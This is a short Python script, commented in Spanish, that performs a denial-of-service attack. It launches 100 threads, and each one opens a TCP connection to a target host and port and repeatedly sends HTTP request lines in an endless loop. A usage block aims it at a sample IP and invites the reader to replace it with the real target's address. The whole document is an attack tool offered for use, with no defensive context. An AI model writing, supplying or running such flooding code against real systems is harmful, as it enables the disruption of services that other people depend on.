import socket
import threading

def enviar_solicitud(host, puerto):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, puerto))
        while True:
            sock.sendto(b"GET / HTTP/1.1\r\n", (host, puerto))
            sock.sendto(b"Host: " + host.encode() + b"\r\n\r\n", (host, puerto))
    except Exception as e:
        print(f"Error: {e}")
    finally:
        sock.close()

def ataque_dos(host, puerto, cantidad_threads):
    for _ in range(cantidad_threads):
        hilo = threading.Thread(target=enviar_solicitud, args=(host, puerto))
        hilo.start()

# Ejemplo de uso
host = "192.168.18.11"  # Cambia por la IP del objetivo
puerto = 80  # Cambia por el puerto del objetivo
cantidad_threads = 100  # Número de hilos que enviarán solicitudes

ataque_dos(host, puerto, cantidad_threads)
